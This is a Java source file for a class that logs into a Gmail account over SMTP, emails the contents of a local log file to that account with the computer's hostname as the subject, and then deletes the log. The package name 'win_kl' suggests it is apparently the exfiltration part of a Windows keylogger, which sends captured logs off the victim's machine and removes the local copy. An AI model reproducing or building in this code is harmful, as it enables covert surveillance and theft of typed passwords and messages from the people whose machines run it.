package com.wassilak.win_kl.email;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Properties;

/**
 * The GmailLogEmailer class is an implementation of the LogEmailer interface
 * that uses Gmail as it's email provider. It is designed to log in as the
 * given user and send an email to itself.
 */
public class GmailLogEmailer implements LogEmailer {

    /**
     * The properties field holds information needed to connect to Gmail's
     * servers.
     */
    private Properties properties;
    /**
     * The address field holds the Gmail account being used to send an email.
     */
    private String address;
    /**
     * The authenticator field represents the Authenticator used to sign into
     * Gmail.
     */
    private Authenticator authenticator;

    /**
     * The GmailLogEmailer constructor forces the user to provide a Gmail
     * account address and password in order to construct the object.
     *
     * @param address  The gmail account address to use when sending an email.
     * @param password The password to the given gmail account.
     */
    public GmailLogEmailer(String address, String password) {
        final String finalAddress = this.address = address;
        final String finalPassword = password;
        properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");
        authenticator = new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(finalAddress, finalPassword);
            }
        };
    }

    /**
     * The emailLog method is an implementation of the emailLog method of the
     * LogEmailer interface. It loads the contents of the given log file, if
     * there are any, and emails it to the address given when the object was
     * constructed. The method then deletes the given logfile, preventing
     * redundant emails.
     *
     * @param logFile The file to be emailed.
     */
    public void emailLog(File logFile) {
        if (logFile.length() > 0) {
            try {
                BufferedReader bufferedReader =
                        new BufferedReader(new FileReader(logFile));
                String buffer = "";
                String line = bufferedReader.readLine();
                while (line != null) {
                    buffer += line;
                    buffer += '\n';
                    line = bufferedReader.readLine();
                }
                bufferedReader.close();
                Session session =
                        Session.getInstance(properties, authenticator);
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(address));
                message.setRecipients(Message.RecipientType.TO,
                        InternetAddress.parse(address));
                message.setSubject(InetAddress.getLocalHost().getHostName());
                message.setText(buffer);
                Transport.send(message);
                logFile.delete();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (MessagingException e) {
                e.printStackTrace();
            }
        }
    }
}
